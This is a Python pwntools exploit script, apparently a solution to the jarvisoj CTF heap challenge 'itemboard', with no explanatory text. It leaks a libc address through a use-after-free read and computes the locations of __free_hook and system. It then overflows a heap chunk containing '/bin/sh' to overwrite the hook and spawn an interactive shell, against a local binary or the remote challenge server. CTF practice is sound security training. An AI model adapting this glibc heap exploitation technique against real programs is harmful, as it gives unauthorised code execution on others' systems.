from pwn import *
local =1 
if local:
    p = process('./itemboard')
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else:
    p = remote('pwn2.jarvisoj.com' , 9887)#nc pwn2.jarvisoj.com 9887
    libc = ELF('./libc-2.19.so')
elf = ELF('./itemboard')

def add(name , length , description):
    p.recvuntil('choose:\n')
    p.sendline('1')
    sleep(0.1)
    p.recvuntil('name?\n')
    p.sendline(name)
    sleep(0.1)
    p.recvuntil('len?\n')
    p.sendline(str(length))
    sleep(0.1)
    p.recvuntil('Description?\n')
    p.sendline(description)
    sleep(0.1)

def lst():
    p.recvuntil('choose:\n')
    p.sendline('2')
    return p.recvuntil('1.Add')[:-6]

def show(no):
    p.recvuntil('choose:\n')
    p.sendline('3')
    p.recvuntil('item?\n')
    p.sendline(str(no))
    a = p.recvuntil('1.Add')[:-6]
    name = a.split('\nDescription:')[0].split('Name:')[1]
    description = a.split('\nDescription:')[1]
    return name , description

def remove(no):
    p.recvuntil('choose:\n')
    p.sendline('4')
    p.recvuntil('item?\n')
    p.sendline(str(no))

def debug():
    print pidof(p)[0]
    raw_input()

add('a' * 0x10 , 0x80 , '1' * 4 + 'Just A Fish Test' + '2' * 4)
add('b' * 0x10 , 0x80 , '3' * 4 + 'Just A Fish Test' + '4' * 4)
add('c' * 0x10 , 0x80 , '5' * 4 + 'Just A Fish Test' + '6' * 4)
remove(1)

if local:
    libc.address = u64(show(1)[1] + '\x00' * 2) - libc.symbols['__malloc_hook'] - 0x68
    free_hook_ptr = libc.address + 0x3c3ef8
else:
    libc.address = u64(show(1)[1] + '\x00' * 2) - libc.symbols['__malloc_hook'] - 0x78
    free_hook_ptr = libc.address + 0x3bdee8
    
system_addr = libc.symbols['system']
success('libc_base => ' + hex(libc.address))
success('free_hook_ptr => ' + hex(free_hook_ptr))
success('system_addr = > ' + hex(system_addr))
add('/bin/sh\x00' , 0x410 , p64(system_addr) + 'a' * 0x400 + p64(free_hook_ptr - 8))
gdb.attach(p)
#remove(3)
p.interactive()
